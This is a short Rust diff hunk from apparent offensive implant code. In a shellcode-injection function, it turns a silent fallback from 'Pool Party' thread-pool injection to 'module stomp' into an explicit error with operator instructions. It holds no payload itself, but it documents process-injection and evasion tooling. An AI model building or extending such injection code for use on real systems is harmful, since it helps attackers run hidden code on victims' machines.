@@ -685,16 +685,16 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
         }
     }
 
-    // method 0 (Pool Party) not requested, gate off, or pid 0 — delegate to
-    // module stomp (the proven baseline).
-    let effective_method = if method == 0 { 2 } else { method };
-    let warn_prefix = if method == 0 {
-        crate::heap::String::from(
-            "WARN: Pool Party (method 0) gated off (set NYX_POOL_PARTY_ON=1 + supply pid) — using module stomp (method 2). ",
-        )
-    } else {
-        crate::heap::String::new()
-    };
+    // method 0 explicitly requested but not usable — return clear error
+    // instead of silently degrading (operator needs to know).
+    if method == 0 {
+        return nyx_protocol::Response::Err(crate::heap::String::from(
+            "Pool Party (method 0) unavailable: gate OFF or pid=0. \
+             Set NYX_POOL_PARTY_ON=1 at build + supply pid, or use method 2."
+        ));
+    }
+    let warn_prefix = crate::heap::String::new();
+    let effective_method = method;
 
     // ---- Existing-process injection (pid != 0) ----
     if pid != 0 {
